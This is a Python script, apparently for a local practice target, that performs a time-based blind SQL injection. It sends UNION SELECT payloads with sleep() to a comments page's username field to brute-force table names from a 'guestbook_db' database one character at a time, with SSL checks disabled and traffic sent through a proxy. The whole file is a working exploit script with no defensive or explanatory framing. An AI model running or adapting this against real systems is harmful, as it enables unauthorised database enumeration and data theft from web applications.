from pprint import pprint
import requests
import time
import sys

DEBUG = False
#Supress SSL warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
'Accept': 'text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Connection': 'Close',
'Upgrade-Insecure-Requests': '1'
}

proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

def s_print(string):
	if DEBUG:
		print(string)

def create_tuple (arr):
	tup = '('
	for (i, a) in enumerate(arr):
		if i != 0:
			tup += ","
		tup += "'"
		tup += a
		tup += "'"
	tup += ')'
	return tup

def get_tbl_helper(url, i, dict, tblsFound, t = 3):
	for dictLet in dict:
		if len(tblsFound) == 0:
			injection ="a' UNION SELECT CASE WHEN SUBSTRING(table_name, %s, 1) = '%s' THEN sleep(%s) ELSE NULL END FROM (SELECT table_name FROM information_schema.tables WHERE table_schema = 'guestbook_db' LIMIT 1) AS t;#" % (i, dictLet, t)
		else:
			injection ="a' UNION SELECT CASE WHEN SUBSTRING(table_name, %s, 1) = '%s' THEN sleep(%s) ELSE NULL END FROM (SELECT table_name FROM information_schema.tables WHERE table_name NOT IN %s AND table_schema = 'guestbook_db' LIMIT 1) AS t;#" % (i, dictLet, t, create_tuple(tblsFound))

		tStart = time.time()
		res = requests.post(url, headers=headers, proxies=proxies, verify=False, data={'username': injection})
		tEnd = time.time()
		tElapsed = tEnd - tStart
		if res.status_code == 200:
			s_print('Elapsed time: ' + str(tElapsed))
			if tElapsed > t:
				sys.stdout.write(str(dictLet))
				sys.stdout.flush()
				return dictLet
		else:
			s_print('Something went wrong')
	return None

def get_tbl(dict, tblsFound):

	url = "http://127.0.0.1/viewcomments.php"
	tblName = ''
	i = 1
	while True:
		correctLet = get_tbl_helper(url, i, dict, tblsFound)
		if correctLet != None:
			tblName += correctLet
		else:
			return tblName

		i += 1


def find_all_tbls(dict):
	tbls = []
	while True:
		tbl = get_tbl(dict, tbls)
		if not tbl:
			break
		print
		tbls.append(tbl)

	return tbls


if __name__ == "__main__":
	dict = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

	print("Bruteforcing combinations")
	print
	print(find_all_tbls(dict))
